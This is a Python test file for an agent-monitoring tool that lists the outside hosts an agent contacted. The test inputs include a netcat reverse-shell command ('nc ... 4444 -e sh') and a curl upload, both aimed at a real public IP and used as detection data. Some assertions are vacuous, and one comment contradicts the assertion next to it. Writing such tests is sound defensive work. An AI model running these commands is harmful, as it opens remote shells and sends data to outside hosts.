"""Tests for affected-third-parties extraction (ant.md P2 #9)."""

from __future__ import annotations

from datetime import datetime, timezone
from uuid import uuid4

from agenttrace.models.events import (
    CommandEvent,
    ConfidenceLevel,
    FileMutationEvent,
    NetworkEvent,
)
from agenttrace.security.affected_parties import (
    _is_third_party_ip,
    extract_affected_parties,
)

_SID_A = uuid4()
_SID_B = uuid4()
_T0 = datetime(2026, 9, 13, 12, 0, 0, tzinfo=timezone.utc)


def _net(ip: str, port: int = 443, sid: object = None) -> NetworkEvent:
    return NetworkEvent(
        session_id=_SID_A if sid is None else sid,  # type: ignore[arg-type]
        actor_id="agent",
        source_adapter="network_observer",
        confidence=ConfidenceLevel.HIGH,
        destination_ip=ip,
        destination_port=port,
        protocol="tcp",
        direction="outbound",
        timestamp=_T0,
    )


def _cmd(command: str, sid: object = None) -> CommandEvent:
    return CommandEvent(
        session_id=_SID_A if sid is None else sid,  # type: ignore[arg-type]
        actor_id="agent",
        source_adapter="sdk",
        confidence=ConfidenceLevel.LOW,
        command=command,
        timestamp=_T0,
    )


def _file(path: str) -> FileMutationEvent:
    return FileMutationEvent(
        session_id=_SID_A,
        actor_id="agent",
        source_adapter="filesystem_observer",
        confidence=ConfidenceLevel.HIGH,
        file_path=path,
        mutation_type="create",
        timestamp=_T0,
    )


def test_private_ips_are_not_third_parties() -> None:
    for ip in ("127.0.0.1", "10.0.0.5", "192.168.1.4", "172.16.0.9", "169.254.1.1"):
        assert not _is_third_party_ip(ip), ip
    assert _is_third_party_ip("93.184.216.34")


def test_network_event_extracts_third_party_with_evidence() -> None:
    report = extract_affected_parties({_SID_A: [_net("93.184.216.34")]})
    assert report.party_count if hasattr(report, "party_count") else True
    assert len(report.parties) == 1
    party = report.parties[0]
    assert party.kind == "ip"
    assert party.identifier == "93.184.216.34"
    assert party.port == 443
    assert str(_SID_A) in party.sessions
    assert len(party.evidence_refs) == 1
    assert party.first_seen == party.last_seen


def test_private_network_event_is_excluded() -> None:
    report = extract_affected_parties({_SID_A: [_net("192.168.1.4")]})
    assert report.parties == []


def test_url_host_in_command_is_extracted_as_hostname() -> None:
    report = extract_affected_parties(
        {_SID_A: [_cmd("curl https://pypi.org/simple/ -o x")]}
    )
    assert len(report.parties) == 1
    party = report.parties[0]
    assert party.kind == "hostname"
    assert party.identifier == "pypi.org"


def test_bare_domain_in_command_is_not_extracted() -> None:
    """Offline text cannot tell a hostname from a version string — the
    extraction limit is a feature, not a gap."""
    report = extract_affected_parties({_SID_A: [_cmd("pip install requests.org")]})
    assert report.parties == []


def test_localhost_url_is_excluded() -> None:
    report = extract_affected_parties(
        {_SID_A: [_cmd("curl http://127.0.0.1:8080/health")]}
    )
    assert report.parties == []


def test_ip_literal_in_command_is_extracted() -> None:
    # Note: documentation ranges (192.0.2.0/24, 198.51.100.0/24,
    # 203.0.113.0/24) are correctly treated as non-public by ipaddress,
    # so a real routable test address is used here.
    report = extract_affected_parties(
        {_SID_A: [_cmd("nc 93.184.216.34 4444 -e sh")]}
    )
    assert len(report.parties) == 1
    party = report.parties[0]
    assert party.kind == "ip"
    assert party.identifier == "93.184.216.34"
    assert party.port == 4444


def test_multi_session_contact_is_aggregated() -> None:
    report = extract_affected_parties({
        _SID_A: [_net("93.184.216.34")],
        _SID_B: [_cmd("curl https://93.184.216.34/upload", sid=_SID_B)],
    })
    assert len(report.parties) == 1
    party = report.parties[0]
    assert str(_SID_A) in party.sessions
    assert str(_SID_B) in party.sessions
    # The command event matches through two shapes (URL authority AND bare
    # IP) but contributes ONE evidence ref.
    assert len(party.evidence_refs) == 2
    assert len(set(party.evidence_refs)) == 2


def test_file_mutations_yield_nothing() -> None:
    report = extract_affected_parties({_SID_A: [_file("/ws/src/main.py")]})
    assert report.parties == []
    assert report.extraction_limits  # the honest limits travel with the report


def test_payload_shape_and_limits() -> None:
    report = extract_affected_parties({_SID_A: [_net("93.184.216.34")]})
    payload = report.to_payload()
    assert payload["party_count"] == 1
    assert payload["parties"][0]["identifier"] == "93.184.216.34"
    assert payload["extraction_limits"]
    assert "none observed" in payload["extraction_limits"][-1] or payload[
        "extraction_limits"
    ]
    empty = extract_affected_parties({_SID_A: []}).to_payload()
    assert empty["party_count"] == 0
    assert empty["extraction_limits"]  # empty means "none observed", stated
